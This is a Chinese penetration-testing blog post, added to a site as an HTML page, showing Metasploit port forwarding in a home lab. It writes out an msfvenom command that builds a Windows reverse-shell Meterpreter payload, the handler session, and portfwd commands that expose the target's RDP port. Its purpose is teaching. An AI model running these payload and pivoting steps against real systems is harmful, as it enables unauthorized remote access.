@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="幻心">
+
+
+
+
+
+<title>Metasploit网络穿透端口转发 | 幻心&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">幻心&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">幻心&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit网络穿透端口转发</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">幻心</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 13, 2020&nbsp;&nbsp;20:00:32</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>Metasploit下Meterpreter中有一个网络命令，可以替代lcx，nc等来解决大部分端口转发问题；</p>
+<p>命令：<code>portfwd</code></p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>Mac【Metasploit】：192.168.43.100</p>
+<p>Win7【目标机】：192.168.43.103【桥接】，开启3389端口方便检测验证</p>
+<p>实际场景：目标机特殊端口禁止外网访问【如3389…】等等；</p>
+<h2 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h2><p>拿到目标机的 meterpreter shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Go0s]: ~ </span><br><span class="line">➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe &gt; ~/Desktop/shell.exe</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No Arch selected, selecting Arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 333 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br></pre></td></tr></table></figure>
+
+<p>直接在跳板机运行上线；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.43.100</span><br><span class="line">lhost =&gt; 192.168.43.100</span><br><span class="line">msf exploit(handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.100:4444 </span><br><span class="line">[*] Sending stage (179267 bytes) to 192.168.43.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.100:4444 -&gt; 192.168.43.103:49236) at 2018-01-09 11:28:21 +0800</span><br></pre></td></tr></table></figure>
+
+<p>使用portfwd进行转发，portfwd是Meterpreter shell的一个网络命令，要先进入这个session；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.</span><br><span class="line">    -R        Indicates a reverse port forward.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the &quot;list&quot; command).</span><br><span class="line">    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host to connect to.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -r 192.168.43.103 -p 3389</span><br><span class="line">[*] Local TCP relay created: :3389 &lt;-&gt; 192.168.43.103:3389</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote               Direction</span><br><span class="line">   -----  -----         ------               ---------</span><br><span class="line">   1      0.0.0.0:3389  192.168.43.103:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br></pre></td></tr></table></figure>
+
+<p>命令：<code>portfwd add -l 3389 -r 192.168.43.103 -p 3389</code></p>
+<p>意思是将远端3389端口转到本地3389端口并监听；</p>
+<p>链接本地127.0.0.1:3389即可登陆到远程服务器；</p>
+<p>oth.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列出端口转发条目</span><br><span class="line">portfwd list</span><br><span class="line"></span><br><span class="line">删除id为1的端口转发</span><br><span class="line">portfwd delete -i 1</span><br><span class="line"></span><br><span class="line">清空所有转发</span><br><span class="line">portfwd flush</span><br></pre></td></tr></table></figure>
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>本地查看端口和服务；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Go0s]: ~ </span><br><span class="line">➜  netstat -antp tcp | grep 3389</span><br><span class="line">(standard input):3:tcp4       0      0  *.3389                 *.*                    LISTEN     </span><br><span class="line"></span><br><span class="line">➜  sudo nmap -sS -p 3389 127.0.0.1  </span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-11 11:35 CST</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds</span><br></pre></td></tr></table></figure>
+
+<p>使用Microsoft Remote Desktop登陆127.0.0.1:3389；</p>
+<p><img src="../img/Metasploit%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.assets/image-20200213213107996.png" alt="image-20200213213107996"></p>
+<p>成功登陆；</p>
+<p><img src="../img/Metasploit%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.assets/image-20200213213128497.png" alt="image-20200213213128497"></p>
+<h2 id="弊端？"><a href="#弊端？" class="headerlink" title="弊端？"></a>弊端？</h2><p>实际使用Portfwd效果可能会差，因为当数据流过大时候会将Meterpreter直接搞掉；</p>
+<p>使用Socks5代理的ew效果会很好，含各种代理各种平台；</p>
+<p>ew下载地址： <a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>幻心</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://huanxinhack.github.io/metasploit%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">http://huanxinhack.github.io/metasploit%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Metasploit-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"># Metasploit,端口转发</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/mysql-udf%E6%8F%90%E6%9D%83/">MySQL UDF提权</a>
+            
+            
+            <a class="next" rel="next" href="/msfvenom%E5%B8%B8%E7%94%A8payload%E5%91%BD%E4%BB%A4/">msfvenom常用payload命令</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 幻心 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
